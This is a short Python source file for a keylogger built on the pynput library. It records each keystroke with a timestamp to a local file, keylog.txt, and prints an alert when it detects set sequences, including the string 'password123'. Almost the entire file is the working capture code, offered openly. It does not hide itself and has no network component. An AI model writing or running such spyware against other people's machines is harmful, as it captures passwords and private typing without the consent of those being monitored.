from pynput.keyboard import Listener
from datetime import datetime

# Create a log file to save keystrokes
log_file = "keylog.txt"

# Buffer to store the last few keys pressed
key_buffer = []

# Predefined key sequences to detect
key_sequences = [
    ['Key.ctrl_l', 'Key.alt_l', 'Key.delete'],  # Example sequence for Ctrl+Alt+Delete
    ['p', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3']  # Example sequence for 'password123'
]

# Function to log keys with timestamp
def log_key(key):
    try:
        # Get the current timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Format the key to remove unwanted characters
        key_str = str(key).replace("'", "")
        
        # Add the key to the buffer
        key_buffer.append(key_str)
        
        # Check for any key sequence match
        for sequence in key_sequences:
            if key_buffer[-len(sequence):] == sequence:
                print(f"\n[ALERT] Detected key sequence: {' '.join(sequence)}")
                # Optionally, trigger an action (e.g., log the alert or perform another action)
        
        # Limit the buffer size to the longest sequence to save memory
        max_sequence_length = max(len(seq) for seq in key_sequences)
        if len(key_buffer) > max_sequence_length:
            key_buffer.pop(0)
        
        # Log the keystroke with timestamp
        with open(log_file, "a") as f:
            if key_str == "Key.space":
                f.write(f"{timestamp} - SPACE\n")
            elif key_str == "Key.enter":
                f.write(f"{timestamp} - ENTER\n")
            elif key_str.startswith("Key."):
                f.write(f"{timestamp} - [{key_str}] \n")
            else:
                f.write(f"{timestamp} - {key_str}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to start the keylogger
def start_keylogger():
    print("Keylogger started... Press 'Ctrl + C' to stop.")
    try:
        with Listener(on_press=log_key) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped. Logs saved to 'keylog.txt'.")

# Start the keylogger
start_keylogger()
